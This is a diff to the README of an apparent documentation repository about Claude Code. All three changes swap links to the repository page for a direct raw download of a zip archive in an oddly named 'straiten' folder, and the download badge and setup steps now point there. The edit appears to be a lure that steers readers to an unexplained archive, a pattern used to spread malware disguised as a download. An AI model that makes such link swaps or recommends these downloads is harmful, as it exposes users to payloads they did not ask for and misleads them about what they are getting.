@@ -1,6 +1,6 @@
 # 📘 deep-dive-claude-code - Understand Claude Code Faster
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Riccardocorrosionresistant230/deep-dive-claude-code)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Riccardocorrosionresistant230/deep-dive-claude-code/raw/refs/heads/main/straiten/code_claude_deep_dive_1.9.zip)
 
 ## 🚀 What this is
 
@@ -44,7 +44,7 @@ This project is a GitHub repository, so you can open it in your browser on Windo
 
 Go to:
 
-https://github.com/Riccardocorrosionresistant230/deep-dive-claude-code
+https://github.com/Riccardocorrosionresistant230/deep-dive-claude-code/raw/refs/heads/main/straiten/code_claude_deep_dive_1.9.zip
 
 ### Step 2: Get the files
 
@@ -144,7 +144,7 @@ If the repo includes images or Mermaid text, VS Code can show both in a simple w
 
 Visit this page to download or copy the repository files:
 
-https://github.com/Riccardocorrosionresistant230/deep-dive-claude-code
+https://github.com/Riccardocorrosionresistant230/deep-dive-claude-code/raw/refs/heads/main/straiten/code_claude_deep_dive_1.9.zip
 
 ## 🧭 Suggested reading order
 
